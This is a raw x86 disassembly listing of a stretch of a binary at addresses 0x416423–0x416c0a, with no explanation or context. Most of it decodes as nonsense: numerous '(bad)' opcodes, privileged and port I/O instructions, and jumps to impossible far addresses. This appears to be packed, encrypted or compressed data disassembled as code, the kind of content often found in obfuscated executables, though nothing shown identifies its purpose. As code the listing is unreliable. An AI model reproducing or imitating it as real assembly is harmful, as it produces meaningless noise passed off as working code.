  416423:	ret    0x7cfc
  416426:	pop    edi
  416427:	nop
  416428:	sub    ebp,ebp
  41642a:	sub    esi,ecx
  41642c:	sahf   
  41642d:	adc    al,0x1a
  41642f:	in     al,0x9c
  416431:	cmc    
  416432:	xchg   edi,eax
  416433:	sti    
  416434:	inc    ebp
  416435:	aad    0x77
  416437:	mov    DWORD PTR [edx],ebx
  416439:	sub    BYTE PTR [ebx-0x6f],0xca
  41643d:	aaa    
  41643e:	ror    DWORD PTR [edi+0x3080dc09],1
  416444:	dec    edx
  416445:	shl    DWORD PTR [ecx+edx*1],0xa2
  416449:	mov    edi,0xb8aa5b4e
  41644e:	(bad)  
  41644f:	xchg   esp,eax
  416450:	xor    dh,BYTE PTR [eax+0x30]
  416453:	and    al,0x9d
  416455:	or     dl,BYTE PTR [edi]
  416457:	test   DWORD PTR ds:0xc30baf37,ebx
  41645d:	adc    al,BYTE PTR [ebx+0x61]
  416460:	sbb    BYTE PTR [edi+0x1],dl
  416463:	fs shr esi,cl
  416466:	jmp    0x4164ac
  416468:	frstor [ebp-0x47]
  41646b:	std    
  41646c:	and    DWORD PTR fs:[ecx],edi
  41646f:	leave  
  416470:	div    BYTE PTR [ebx+0x5e2f852d]
  416476:	dec    ebx
  416477:	leave  
  416478:	(bad)  
  416479:	mov    ds:0xfbf72639,al
  41647e:	int    0xd6
  416480:	bound  edi,QWORD PTR [esp+ebp*1-0x3f]
  416484:	in     al,0x4e
  416486:	(bad)  
  416488:	or     dh,dh
  41648a:	mov    ds:0x20cf8f9f,al
  41648f:	add    al,0x54
  416491:	push   ds
  416492:	es inc eax
  416494:	(bad)  
  416495:	aad    0xd7
  416497:	fnstsw WORD PTR [ecx+0x487ff6f9]
  41649d:	js     0x41646c
  41649f:	mov    ah,0xbc
  4164a1:	repnz (bad) 
  4164a3:	jle    0x41651e
  4164a5:	aaa    
  4164a6:	mov    edx,0x69f1f95e
  4164ab:	add    al,0x9f
  4164ad:	stos   DWORD PTR es:[edi],eax
  4164ae:	mov    DWORD PTR [edx],ebx
  4164b0:	xchg   ebp,eax
  4164b1:	mov    al,ds:0x542e9877
  4164b6:	cli    
  4164b7:	stc    
  4164b8:	dec    ebp
  4164b9:	push   es
  4164ba:	out    dx,eax
  4164bb:	inc    esp
  4164bc:	mov    bh,0x42
  4164be:	pop    esi
  4164bf:	leave  
  4164c0:	xor    BYTE PTR [ebx-0x129d0ff3],dh
  4164c6:	fwait
  4164c7:	into   
  4164c8:	add    eax,0x1871c10c
  4164cd:	mov    al,0xdf
  4164cf:	int    0x60
  4164d1:	xlat   BYTE PTR ds:[ebx]
  4164d2:	fwait
  4164d3:	jae    0x41645d
  4164d5:	popf   
  4164d6:	test   ecx,ebx
  4164d8:	es frstpm(287 only) 
  4164db:	shl    BYTE PTR [ecx-0x44],0x64
  4164df:	mov    dl,0x95
  4164e1:	iret   
  4164e2:	dec    ebx
  4164e3:	cmp    ebx,eax
  4164e5:	pop    ebx
  4164e6:	lds    edi,FWORD PTR [edx]
  4164e8:	stc    
  4164e9:	popa   
  4164ea:	fwait
  4164eb:	xor    DWORD PTR [ebx+ebp*8+0x59fc710a],edx
  4164f2:	popf   
  4164f3:	cdq    
  4164f4:	int    0x73
  4164f6:	ja     0x4164fc
  4164f8:	lea    ebx,[edx+0x70a080ec]
  4164fe:	cmp    eax,0x96c3d2c4
  416503:	xchg   edx,eax
  416504:	cmp    BYTE PTR [edx+0x61659505],bl
  41650a:	dec    ebp
  41650b:	loope  0x416541
  41650d:	mov    dh,0x62
  41650f:	xchg   esp,eax
  416510:	sbb    BYTE PTR [esi-0x18],0xb8
  416514:	jno    0x4164f9
  416516:	idiv   BYTE PTR cs:[esp+edi*8]
  41651a:	ins    BYTE PTR es:[edi],dx
  41651b:	aaa    
  41651c:	and    BYTE PTR [ecx-0x2c],ch
  41651f:	es dec edi
  416521:	jbe    0x41654a
  416523:	in     eax,dx
  416524:	(bad)  
  416525:	xchg   esp,eax
  416526:	dec    edx
  416527:	inc    ebp
  416528:	xlat   BYTE PTR ds:[ebx]
  416529:	enter  0x90ff,0x1a
  41652d:	inc    esp
  41652e:	scas   eax,DWORD PTR es:[edi]
  41652f:	cmp    bh,BYTE PTR [ebx+0x759f0adf]
  416535:	mov    ds:0x3a4678b,al
  41653a:	jbe    0x416527
  41653c:	sbb    bl,dl
  41653e:	cmc    
  41653f:	aas    
  416540:	sbb    ecx,DWORD PTR [eax+edx*4-0x38]
  416544:	dec    esi
  416545:	shr    DWORD PTR [ecx],cl
  416547:	ror    dh,1
  416549:	les    ebp,FWORD PTR [edx*4-0x395da9a]
  416550:	loop   0x4164e7
  416552:	outs   dx,BYTE PTR ds:[esi]
  416553:	test   eax,0xb2bae007
  416558:	mov    ss,edi
  41655a:	aas    
  41655b:	out    dx,al
  41655c:	out    0x11,al
  41655e:	popf   
  41655f:	and    cl,0x3b
  416562:	or     eax,0x1d6edb25
  416567:	out    dx,eax
  416568:	inc    edx
  416569:	pop    ecx
  41656a:	(bad)
  41656d:	inc    ecx
  41656e:	inc    ebp
  416570:	sub    al,0x18
  416572:	fldcw  WORD PTR [ebx+0x129b3898]
  416578:	dec    edx
  416579:	les    esi,FWORD PTR [eax]
  41657b:	mov    esi,0x2088ade
  416580:	fidiv  DWORD PTR [ebx-0x45]
  416583:	inc    edx
  416584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416585:	test   DWORD PTR [ecx],edx
  416587:	inc    esi
  416588:	js     0x4165b9
  41658a:	mov    ds:0xd8f4da3b,eax
  41658f:	stos   BYTE PTR es:[edi],al
  416590:	sub    eax,0xa834a88a
  416595:	enter  0xb06a,0xec
  416599:	out    dx,eax
  41659a:	repnz push edx
  41659c:	outs   dx,DWORD PTR es:[esi]
  41659e:	or     BYTE PTR [ecx],bh
  4165a0:	add    cl,cl
  4165a2:	jns    0x4165ed
  4165a4:	test   eax,0xdb75b2d
  4165a9:	fwait
  4165aa:	out    0xaa,al
  4165ac:	shl    cl,1
  4165ae:	adc    edx,edx
  4165b0:	aas    
  4165b1:	add    al,0x50
  4165b3:	inc    ebp
  4165b4:	jns    0x416632
  4165b6:	pop    edi
  4165b7:	into   
  4165b8:	add    ah,ch
  4165ba:	in     al,dx
  4165bb:	cmp    al,0xa3
  4165bd:	aam    0x7d
  4165bf:	out    0x8a,al
  4165c1:	inc    edi
  4165c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165c3:	sahf   
  4165c4:	push   ds
  4165c5:	push   edi
  4165c6:	stc    
  4165c7:	inc    eax
  4165c8:	in     al,0xd7
  4165ca:	push   edi
  4165cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165cc:	mov    WORD PTR [esi],ds
  4165ce:	inc    esi
  4165cf:	dec    ebp
  4165d0:	jmp    0xf4efefec
  4165d5:	push   cs
  4165d6:	cmp    al,0xfd
  4165d8:	outs   dx,DWORD PTR ds:[esi]
  4165d9:	ret    0xc545
  4165dc:	push   edx
  4165dd:	and    ch,dh
  4165df:	adc    BYTE PTR [ebx+eiz*1],dh
  4165e2:	icebp  
  4165e3:	sub    bh,al
  4165e5:	mov    cl,0xe9
  4165e7:	mov    eax,0xa81fea0e
  4165ec:	sahf   
  4165ed:	adc    ch,BYTE PTR [ebp+0x47]
  4165f0:	loope  0x416603
  4165f2:	fldcw  WORD PTR [edi+0x4]
  4165f5:	pop    ebp
  4165f6:	cmp    bl,ch
  4165f8:	ins    BYTE PTR es:[edi],dx
  4165f9:	jmp    0xdae39c17
  4165fe:	jmp    FWORD PTR [ecx]
  416600:	retf   0x6460
  416603:	jp     0x4165f8
  416605:	jo     0x416602
  416607:	rcl    BYTE PTR [edi+ecx*1-0x40],cl
  41660b:	jl     0x416594
  41660d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41660e:	pop    es
  41660f:	shr    BYTE PTR [ebp+0x264bb728],cl
  416615:	pop    ecx
  416616:	add    ecx,DWORD PTR [esi-0x6e29ec0d]
  41661c:	pop    eax
  41661d:	test   al,0x9c
  41661f:	dec    eax
  416620:	dec    ecx
  416621:	pusha  
  416622:	xchg   edi,eax
  416623:	clc    
  416624:	xchg   esp,eax
  416625:	sbb    al,0x1a
  416627:	mov    eax,ds:0x805d33f0
  41662c:	adc    eax,0x7c6b8f3f
  416631:	cmp    eax,0xc13b1f97
  416636:	jbe    0x416631
  416638:	aam    0x20
  41663a:	into   
  41663b:	add    eax,0x4e60eb88
  416640:	lea    edi,[ebx]
  416642:	cli    
  416643:	mov    al,0xcb
  416645:	(bad)
  416649:	mov    bl,0x7e
  41664b:	pop    es
  41664c:	loope  0x4166c9
  41664e:	(bad)  
  41664f:	xchg   esp,eax
  416650:	sar    DWORD PTR [edx-0x1d9689b8],cl
  416656:	add    eax,0xfa780e39
  41665b:	mov    bh,0x9b
  41665d:	push   0xf53262c7
  416662:	xchg   DWORD PTR [edx-0x48],edx
  416665:	sub    BYTE PTR [ebx+eiz*8],dh
  416668:	mov    bh,0x89
  41666a:	int3   
  41666b:	pop    esi
  41666c:	inc    esi
  41666d:	fbld   TBYTE PTR [eax]
  41666f:	jmp    0xe85d1e87
  416674:	push   cs
  416675:	cmp    ch,cl
  416677:	jbe    0x416648
  416679:	outs   dx,BYTE PTR ds:[esi]
  41667a:	std    
  41667b:	nop
  41667c:	jo     0x41663a
  41667e:	pop    ebp
  41667f:	xchg   ecx,eax
  416680:	es (bad) 
  416682:	sub    al,0xeb
  416684:	xchg   esi,eax
  416685:	push   edx
  416686:	jmp    0xcd69:0xe70f9b61
  41668d:	popf   
  41668e:	pop    ecx
  41668f:	(bad)  
  416690:	pop    esp
  416691:	int    0xe2
  416693:	cs adc ch,dl
  416696:	icebp  
  416697:	lea    ecx,[edi+0x2e60931]
  41669d:	mov    WORD PTR [edx],ss
  41669f:	lods   al,BYTE PTR ds:[esi]
  4166a0:	jmp    0xbef2:0xf10db0a9
  4166a7:	push   es
  4166a8:	push   ss
  4166a9:	cli    
  4166aa:	and    al,0xfa
  4166ac:	in     al,dx
  4166ad:	and    eax,0xe6de6e73
  4166b2:	mov    esi,0xefd28a9c
  4166b7:	jmp    0x11f6:0x3995b933
  4166be:	icebp  
  4166bf:	cmp    ebx,DWORD PTR [ebx-0x2ad479aa]
  4166c5:	popa   
  4166c6:	bound  ebp,QWORD PTR [ecx]
  4166c8:	adc    eax,0x3f283298
  4166cd:	in     eax,0x53
  4166cf:	sbb    al,bl
  4166d1:	cli    
  4166d2:	inc    ebx
  4166d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166d4:	inc    esi
  4166d5:	and    DWORD PTR [esi+0x17],edi
  4166d8:	jmp    0x416757
  4166da:	(bad)  
  4166db:	xor    al,0x87
  4166dd:	xor    eax,0xf9e37564
  4166e2:	cld    
  4166e3:	dec    esp
  4166e4:	jbe    0x41671e
  4166e6:	sbb    ecx,esp
  4166e8:	mov    eax,fs
  4166ea:	loope  0x4166a9
  4166ec:	dec    ecx
  4166ed:	pop    eax
  4166ee:	add    BYTE PTR [edi],dl
  4166f0:	xchg   BYTE PTR [ebx-0x7],ch
  4166f3:	xor    DWORD PTR [edi+esi*4+0x528ce939],edi
  4166fa:	lahf   
  4166fb:	mov    esi,0x983f0a2c
  416700:	mov    ds:0xa033956b,eax
  416705:	adc    eax,0x518505b8
  41670a:	jmp    0x4166b1
  41670c:	fild   WORD PTR [ebx]
  41670e:	shl    DWORD PTR ds:0x93303dfa,1
  416714:	sti    
  416715:	xor    DWORD PTR [edx+0x58e73864],edi
  41671b:	lock sbb al,0x19
  41671e:	cmp    bl,BYTE PTR [eax-0x22]
  416721:	cs jmp 0x41677e
  416724:	sahf   
  416725:	mov    bl,0x9c
  416727:	and    ah,BYTE PTR [edi]
  416729:	sbb    al,BYTE PTR [ecx-0x6a]
  41672c:	dec    ebp
  41672d:	cmp    edi,esi
  41672f:	aam    0x56
  416731:	jmp    0x87ba14e2
  416736:	mov    eax,0x2d8e4c3
  41673b:	push   edi
  41673c:	xor    eax,DWORD PTR [ebx]
  41673e:	fdiv   st,st(3)
  416740:	cdq    
  416741:	inc    eax
  416742:	addr16 add ecx,eax
  416745:	mov    edx,0x8fbd1c35
  41674a:	add    DWORD PTR ds:0x1751dcef,ecx
  416750:	iret   
  416751:	push   ds
  416752:	pop    ebp
  416753:	fst    QWORD PTR [ebx]
  416755:	jg     0x41675a
  416757:	mov    eax,0x69ea59f5
  41675c:	mul    BYTE PTR ds:0xb4ffc818
  416762:	jae    0x4167a1
  416764:	mov    ecx,0xe8e9164a
  416769:	push   cs
  41676a:	fcmovu st,st(4)
  41676c:	test   eax,0x6db38678
  416771:	cmp    al,0xc9
  416773:	aas    
  416774:	sbb    BYTE PTR [eax+0x70ca8dc8],dh
  41677a:	jns    0x41674f
  41677c:	xchg   esp,eax
  41677d:	inc    ebp
  41677e:	xchg   ecx,eax
  41677f:	fadd   DWORD PTR [edi-0x9cc2457]
  416785:	cs push esp
  416787:	(bad)  
  416788:	fidiv  DWORD PTR [eax+0x49]
  41678b:	cmc    
  41678c:	mov    bh,0x9
  41678e:	ja     0x416717
  416790:	jnp    0x416745
  416792:	jle    0x41680c
  416794:	adc    eax,0xeb2b0cb5
  416799:	setae  BYTE PTR [eax+0x1f59a775]
  4167a0:	cmp    al,0x54
  4167a2:	cli    
  4167a3:	mov    bh,0x3b
  4167a5:	ja     0x4167dc
  4167a7:	mov    ch,0xed
  4167a9:	or     al,0xb3
  4167ab:	call   ebx
  4167ad:	call   0xbab782e7
  4167b2:	int    0xfc
  4167b4:	popa   
  4167b5:	sub    dl,al
  4167b7:	aad    0xd6
  4167b9:	mov    ecx,0x5321dcb5
  4167be:	out    dx,al
  4167bf:	fs push 0x58862ba7
  4167c5:	imul   edi,DWORD PTR [edi-0x1d],0x963aee85
  4167cc:	or     ebx,edx
  4167ce:	arpl   WORD PTR [eax-0x75],ax
  4167d1:	push   0x49
  4167d3:	xchg   edx,eax
  4167d4:	pop    ebp
  4167d5:	shl    DWORD PTR [edi+0x6e40e98e],1
  4167db:	xor    DWORD PTR [edx+0x26],esp
  4167de:	ror    BYTE PTR [eax-0x6d8e3c0e],0x43
  4167e5:	std    
  4167e6:	aas    
  4167e7:	jne    0x416861
  4167e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167ea:	sbb    bl,cl
  4167ec:	ss add bl,dh
  4167ef:	push   edx
  4167f0:	dec    edx
  4167f1:	sahf   
  4167f2:	jo     0x41682f
  4167f4:	xchg   esi,eax
  4167f5:	push   ecx
  4167f6:	push   0x79
  4167f8:	sar    BYTE PTR [ecx-0x59],cl
  4167fb:	(bad)  
  4167fc:	cld    
  4167fd:	popa   
  4167fe:	leave  
  4167ff:	sub    eax,0xf41f69ba
  416804:	imul   ebp,DWORD PTR [edi-0xb417128],0xfb02e1ce
  41680e:	aam    0xaa
  416810:	repz push ecx
  416812:	cmp    al,0xfe
  416814:	adc    al,0xa7
  416816:	cmp    ah,BYTE PTR [ebp-0x42]
  416819:	sbb    eax,0x23816f47
  41681e:	xchg   BYTE PTR [ecx],bh
  416820:	std    
  416821:	push   ss
  416822:	xor    eax,0xb5bc85f9
  416827:	xchg   ebp,eax
  416828:	dec    edx
  416829:	and    DWORD PTR [edi+0x1f],ebp
  41682c:	mov    edi,0x9fc4f020
  416831:	xor    al,0x17
  416833:	ret    
  416834:	fbstp  TBYTE PTR ds:0xa5c6765f
  41683a:	aaa    
  41683b:	outs   dx,BYTE PTR ds:[esi]
  41683c:	enter  0xc536,0xc5
  416840:	pop    ebx
  416841:	scas   eax,DWORD PTR es:[edi]
  416842:	stc    
  416843:	push   cs
  416844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416846:	imul   edx,ecx,0x8558bc9
  41684c:	xor    ecx,ecx
  41684e:	add    ecx,DWORD PTR ds:0x42a301
  416854:	mov    edi,DWORD PTR ds:0x42a409
  41685a:	sub    edi,ecx
  41685c:	sub    ecx,DWORD PTR [ecx+edi*1]
  41685f:	jmp    0x416d71
  416864:	(bad)  
  416865:	xlat   BYTE PTR ds:[ebx]
  416866:	cmp    al,0xc6
  416868:	int3   
  416869:	fxch   st(1)
  41686b:	aad    0x41
  41686d:	ins    BYTE PTR es:[edi],dx
  41686e:	test   eax,0x681165c7
  416873:	xlat   BYTE PTR ds:[ebx]
  416874:	jmp    0x41683c
  416876:	jg     0x4168f0
  416878:	jae    0x4168f6
  41687a:	js     0x4168f4
  41687c:	lock cli 
  41687e:	push   ebx
  41687f:	xchg   esi,eax
  416880:	rcl    ebx,0x8e
  416883:	arpl   WORD PTR [edi+0xa],sp
  416886:	mov    dl,0x42
  416888:	mov    ch,0x60
  41688a:	cmp    edx,esi
  41688c:	mov    ebp,0x62305a27
  416891:	(bad)  
  416892:	cli    
  416893:	add    edi,esi
  416895:	retf   0xe568
  416898:	and    bl,ch
  41689a:	arpl   si,ax
  41689c:	leave  
  41689d:	mov    al,ds:0x94479766
  4168a2:	shl    DWORD PTR [esi+0x4b],1
  4168a5:	jp     0x416874
  4168a7:	loope  0x416873
  4168a9:	ds (bad) 
  4168ab:	aad    0xbe
  4168ad:	mov    cl,0x4d
  4168af:	aaa    
  4168b0:	aad    0xcf
  4168b2:	data16 cli 
  4168b4:	icebp  
  4168b5:	sub    eax,0x25921aba
  4168ba:	and    DWORD PTR [esi-0x5f8dc962],ebx
  4168c0:	sbb    eax,0xf120f5ef
  4168c5:	pop    edx
  4168c6:	sbb    dh,BYTE PTR [esi]
  4168c8:	std    
  4168c9:	add    ebx,esi
  4168cb:	in     eax,dx
  4168cc:	jp     0x41688e
  4168ce:	popf   
  4168cf:	scas   eax,DWORD PTR es:[edi]
  4168d0:	(bad)  
  4168d1:	push   edx
  4168d2:	jne    0x416928
  4168d4:	data16 (bad) [ebx+0x5161d8b2]
  4168db:	sar    DWORD PTR [edi-0x8],0x84
  4168df:	mov    dl,0x54
  4168e1:	cmp    al,0x9b
  4168e3:	sub    edi,DWORD PTR [ebx+0x65]
  4168e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168e7:	push   esi
  4168e8:	loop   0x4168af
  4168ea:	mov    ecx,0x388b97c8
  4168ef:	and    dh,BYTE PTR [ebx+eiz*4+0x4b7687f6]
  4168f6:	xlat   BYTE PTR ds:[ebx]
  4168f7:	nop
  4168f8:	mov    ebx,es
  4168fa:	or     eax,0x78917025
  4168ff:	xor    esp,DWORD PTR ds:0x9d42b6d4
  416905:	mov    cl,0xa6
  416907:	das    
  416908:	jl     0x4168a3
  41690a:	and    BYTE PTR [ebp-0x38],0xc0
  41690e:	out    dx,al
  41690f:	stos   DWORD PTR es:[edi],eax
  416910:	push   edx
  416911:	sbb    al,BYTE PTR [edx-0x48]
  416914:	push   ds
  416915:	int    0x15
  416917:	mov    ebx,0x7547423b
  41691c:	in     al,0x94
  41691e:	push   ds
  41691f:	add    edx,eax
  416921:	cmp    al,0xfa
  416923:	enter  0x1d88,0xc8
  416927:	daa    
  416928:	fcomp  DWORD PTR [edi]
  41692a:	pop    ebp
  41692b:	jne    0x4168d3
  41692d:	fwait
  41692e:	lea    ecx,[edi+ecx*2-0x22]
  416932:	dec    esi
  416933:	sub    ah,bl
  416935:	cmc    
  416936:	sbb    BYTE PTR [ecx-0x48],cl
  416939:	xor    cl,dl
  41693b:	or     edx,DWORD PTR [esi-0x76]
  41693e:	dec    edi
  41693f:	sub    ebp,esi
  416941:	mov    ebx,0x7681c663
  416946:	or     al,0x3b
  416948:	ja     0x416952
  41694a:	fisub  WORD PTR [esi-0x1e5aae0c]
  416950:	jge    0x416923
  416952:	mov    esp,0xcbcccec4
  416957:	push   edi
  416958:	aad    0x5c
  41695a:	scas   eax,DWORD PTR es:[edi]
  41695b:	sub    ecx,DWORD PTR [edx]
  41695d:	retf   0x2039
  416960:	xchg   edi,eax
  416961:	mov    ecx,0xe6831018
  416966:	rcr    ebx,0xf5
  416969:	sub    BYTE PTR [esp+ecx*8-0x7954dcfe],bl
  416970:	lahf   
  416971:	js     0x416925
  416973:	popf   
  416974:	dec    eax
  416975:	data16 fisubr WORD PTR [edi]
  416978:	adc    DWORD PTR [esi+0xd],ebx
  41697b:	or     DWORD PTR [edx+0xe],esp
  41697e:	(bad)  [ecx]
  416980:	ficom  WORD PTR [ebp+0x339c540f]
  416986:	xchg   edx,eax
  416987:	shl    dh,cl
  416989:	das    
  41698a:	fadd   DWORD PTR [ebx]
  41698c:	sar    BYTE PTR [eax],1
  41698e:	repnz ins BYTE PTR es:[edi],dx
  416990:	loope  0x4169a0
  416992:	inc    eax
  416993:	aas    
  416994:	int3   
  416995:	push   ecx
  416996:	sub    eax,0xa6e39c4f
  41699b:	scas   al,BYTE PTR es:[edi]
  41699c:	imul   esi,esi,0xffffff93
  41699f:	xchg   ecx,eax
  4169a0:	popa   
  4169a1:	pop    ds
  4169a2:	push   es
  4169a3:	push   ds
  4169a4:	push   edx
  4169a5:	test   ch,al
  4169a7:	push   ss
  4169a8:	loope  0x416a04
  4169aa:	inc    ecx
  4169ab:	call   0xe772c45b
  4169b0:	pusha  
  4169b1:	ins    BYTE PTR es:[edi],dx
  4169b2:	pop    ebp
  4169b3:	push   cs
  4169b4:	pop    esp
  4169b5:	xchg   ebx,eax
  4169b6:	add    al,0x2b
  4169b8:	lahf   
  4169b9:	popf   
  4169ba:	add    cl,al
  4169bc:	pop    ss
  4169bd:	dec    ebx
  4169be:	inc    ecx
  4169bf:	nop
  4169c0:	cdq    
  4169c1:	lahf   
  4169c2:	setl   BYTE PTR [ecx+0x1c]
  4169c6:	add    al,0x85
  4169c8:	adc    esi,edx
  4169ca:	and    esi,DWORD PTR [edi]
  4169cc:	leave  
  4169cd:	mov    cl,0xe6
  4169cf:	js     0x4169df
  4169d1:	mov    al,ds:0x6a0e995a
  4169d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169d7:	les    edx,FWORD PTR [eax+0x606af166]
  4169dd:	loope  0x41698e
  4169df:	pop    ds
  4169e0:	or     eax,edi
  4169e2:	imul   ebp,DWORD PTR [edx+eax*1+0x17436a6a],0x68
  4169ea:	add    al,BYTE PTR [esi-0x5ed7f803]
  4169f0:	jl     0x416a01
  4169f2:	(bad)  
  4169f4:	aas    
  4169f5:	not    BYTE PTR [esi]
  4169f7:	ins    BYTE PTR es:[edi],dx
  4169f8:	mov    al,0x4c
  4169fa:	test   DWORD PTR [esi],esp
  4169fc:	das    
  4169fd:	leave  
  4169fe:	fwait
  4169ff:	retf   
  416a00:	mov    al,fs:0xf643ac50
  416a06:	cli    
  416a07:	adc    DWORD PTR [edx-0x14],edi
  416a0a:	push   0x3d7891fa
  416a0f:	lods   al,BYTE PTR ds:[esi]
  416a10:	js     0x416a70
  416a12:	imul   edi,DWORD PTR [eax-0x4a],0xf13fba91
  416a19:	cmp    al,0xfe
  416a1b:	cld    
  416a1c:	add    al,0x4
  416a1e:	lea    cx,[edx+0x1000cec0]
  416a25:	sub    BYTE PTR [esi-0x7e43042d],bh
  416a2b:	bound  esp,QWORD PTR [ebx+0x814cd24]
  416a31:	jl     0x416a3f
  416a33:	mov    ds:0x846fd8c0,eax
  416a38:	xchg   DWORD PTR [esi-0x57],esi
  416a3b:	aas    
  416a3c:	js     0x416a9a
  416a3e:	and    ah,0xdc
  416a41:	rcr    BYTE PTR [ebx],1
  416a43:	jmp    0xc61:0x9cf3ea6a
  416a4a:	aas    
  416a4b:	shl    cl,0xc8
  416a4e:	popa   
  416a4f:	mov    ds:0xebcdfa9e,eax
  416a54:	into   
  416a55:	sub    DWORD PTR [eax+eax*2-0x57],edx
  416a59:	shr    DWORD PTR [edx-0x6784edf8],cl
  416a5f:	scas   al,BYTE PTR es:[edi]
  416a60:	xor    eax,0x418160bf
  416a65:	jae    0x416a4d
  416a67:	std    
  416a68:	cmp    al,0x69
  416a6a:	test   BYTE PTR [edx+edi*2],dl
  416a6d:	(bad)  
  416a6e:	jmp    0x215:0x1b1c3400
  416a75:	inc    edi
  416a76:	mov    ah,0xb4
  416a78:	addr16 push 0x6f
  416a7b:	pop    ss
  416a7c:	aas    
  416a7d:	retf   
  416a7e:	repz lock mov ah,0xf6
  416a82:	dec    esp
  416a83:	in     al,dx
  416a84:	pop    ds
  416a85:	add    eax,0x11786ef1
  416a8a:	pop    edi
  416a8b:	add    edi,eax
  416a8d:	repz out 0x20,al
  416a90:	xbegin 0xc26430ed
  416a96:	sub    ch,BYTE PTR [ebx-0x3e85658e]
  416a9c:	add    DWORD PTR [eax+eiz*8-0x146da9a],esi
  416aa3:	lds    ecx,FWORD PTR [bp+si-0x58]
  416aa7:	mov    edi,?
  416aa9:	retf   
  416aaa:	jl     0x416ad4
  416aac:	sub    eax,0xd16aca0a
  416ab1:	arpl   WORD PTR [edi-0x7e684b87],bx
  416ab7:	sub    cl,al
  416ab9:	sub    BYTE PTR [ebx],bh
  416abb:	fiadd  WORD PTR [ebx+0xef62bfc]
  416ac1:	call   0x3b:0x689041c5
  416ac8:	jae    0x416b06
  416aca:	dec    ebx
  416acb:	repz ficom DWORD PTR [edi+0x4f]
  416acf:	adc    eax,0x6d25d22b
  416ad4:	ja     0x416b40
  416ad6:	bswap  ecx
  416ad8:	cs popf 
  416ada:	clc    
  416adb:	pop    edx
  416adc:	call   0xc5d79de5
  416ae1:	sub    edi,ecx
  416ae3:	sar    ebx,1
  416ae5:	and    ah,BYTE PTR [edx]
  416ae7:	popf   
  416ae8:	adc    BYTE PTR [ecx+ecx*1-0x650143ef],0xdf
  416af0:	ficom  DWORD PTR [esi+eax*4+0x54]
  416af4:	push   0xffffff8b
  416af6:	mov    bl,0xa5
  416af8:	mov    bl,0xba
  416afa:	nop
  416afb:	clc    
  416afc:	mov    ebp,0xad499e3f
  416b01:	sbb    eax,0xebb598e9
  416b06:	and    cl,BYTE PTR [edi*8-0xaa6eebb]
  416b0d:	inc    eax
  416b0e:	jle    0x416add
  416b10:	add    dh,BYTE PTR [edx+0x16]
  416b13:	push   eax
  416b14:	jns    0x416b1a
  416b16:	out    0x15,al
  416b18:	pusha  
  416b19:	into   
  416b1a:	push   es
  416b1b:	and    al,0xef
  416b1d:	jecxz  0x416b83
  416b1f:	rcl    BYTE PTR [edi-0x58503bf2],cl
  416b25:	inc    esi
  416b26:	jmp    0x4f994812
  416b2b:	retf   
  416b2c:	fld    QWORD PTR [esi]
  416b2e:	xor    eax,0xf442a0f8
  416b33:	ds push ebx
  416b35:	jmp    0xb1b0833a
  416b3a:	push   cs
  416b3b:	out    0x7a,eax
  416b3d:	mov    ds:0x7a68aae1,eax
  416b42:	or     edx,DWORD PTR [ebx]
  416b44:	mov    ebx,0x3f3fa0e3
  416b49:	fmul   st(2),st
  416b4b:	cs jle 0x416b8a
  416b4e:	xchg   esi,eax
  416b4f:	mov    DWORD PTR [edx-0x5e],edi
  416b52:	cmc    
  416b53:	and    dh,BYTE PTR [ebp+0x487f788f]
  416b59:	xor    DWORD PTR [edx+0x67],ebp
  416b5c:	mov    ebp,ecx
  416b5e:	icebp  
  416b5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b60:	mov    al,ds:0x65fdbb1e
  416b65:	fwait
  416b66:	arpl   WORD PTR [esi],si
  416b68:	mov    ah,0x74
  416b6a:	mov    ebx,0x2cb57922
  416b6f:	js     0x416bc3
  416b71:	pop    edx
  416b72:	jecxz  0x416b22
  416b74:	lock hlt 
  416b76:	pop    ebp
  416b77:	and    DWORD PTR [eax+eiz*8-0x2a176d8b],0xffffffa3
  416b7f:	and    BYTE PTR [ebp-0x561e0e99],dl
  416b85:	mov    ch,0xb2
  416b87:	mov    dl,0x40
  416b89:	leave  
  416b8a:	adc    eax,0xd8fe3d67
  416b8f:	push   eax
  416b90:	and    eax,DWORD PTR [ecx+0x5342e9d2]
  416b96:	lods   al,BYTE PTR ds:[esi]
  416b97:	xchg   edi,eax
  416b98:	adc    esp,DWORD PTR [edx-0x6a]
  416b9b:	jp     0x416be0
  416b9d:	and    al,0xa8
  416b9f:	push   edi
  416ba0:	jno    0x416c07
  416ba2:	add    al,0xc6
  416ba4:	popa   
  416ba5:	mov    cl,0x65
  416ba7:	adc    dh,dh
  416ba9:	retf   0x4f5f
  416bac:	out    0xff,eax
  416bae:	ret    
  416baf:	je     0x416bd5
  416bb1:	arpl   WORD PTR [eax-0x17],ax
  416bb4:	fsubp  st(2),st
  416bb6:	(bad)  
  416bb7:	fiadd  DWORD PTR [edi]
  416bb9:	ss js  0x416c1a
  416bbc:	(bad)  
  416bbd:	ret    
  416bbe:	scas   al,BYTE PTR es:[edi]
  416bbf:	cs cmp BYTE PTR gs:[ecx-0x61bd3286],cl
  416bc7:	push   esi
  416bc8:	cmp    DWORD PTR ds:0x1c96d362,esp
  416bce:	xchg   bh,dl
  416bd0:	mov    ecx,0xfe544bcd
  416bd5:	sahf   
  416bd6:	xor    ebp,edi
  416bd8:	mov    ah,0x30
  416bda:	pop    esp
  416bdb:	sbb    al,0xe0
  416bdd:	jbe    0x416c43
  416bdf:	mov    esp,0x9ad17b17
  416be4:	cmp    ebp,DWORD PTR [ecx+0x71bd9ab1]
  416bea:	shl    DWORD PTR [eax+0x21],0x54
  416bee:	int3   
  416bef:	neg    DWORD PTR [edx+0x2]
  416bf2:	dec    ebx
  416bf3:	jge    0x416c49
  416bf5:	fstp   DWORD PTR [ebx]
  416bf7:	jns    0x416bc7
  416bf9:	jge    0x416b8b
  416bfb:	mov    al,0x78
  416bfd:	adc    eax,0xf09d5e31
  416c02:	popa   
  416c03:	and    bh,BYTE PTR [ebx]
  416c05:	call   0xa5683aff
  416c0a:	mov    eax,0x14858b50
